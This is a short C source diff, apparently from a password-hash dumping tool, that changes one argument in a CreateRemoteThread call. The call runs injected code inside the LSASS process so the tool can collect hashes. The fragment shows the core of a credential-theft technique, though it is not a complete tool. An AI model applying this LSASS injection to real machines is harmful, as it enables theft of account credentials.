@@ -530,7 +530,7 @@ int __declspec(dllexport) control(DWORD dwMillisecondsToWait, char **hashresults
 		dwBytesWritten = 0;
 
 		/* start the remote thread */
-		if ((hThreadHandle = CreateRemoteThread(hLsassHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pvFunctionMemory, pvParameterMemory, NULL, &dwThreadId)) == NULL) { dwError = 1; break; }
+		if ((hThreadHandle = CreateRemoteThread(hLsassHandle, NULL, 0, (LPTHREAD_START_ROUTINE)pvFunctionMemory, pvParameterMemory, 0, &dwThreadId)) == NULL) { dwError = 1; break; }
 		
 		/* wait until the data is ready to be collected */
 		if (WaitForSingleObject(hReadLock, dwMillisecondsToWait) != WAIT_OBJECT_0) {
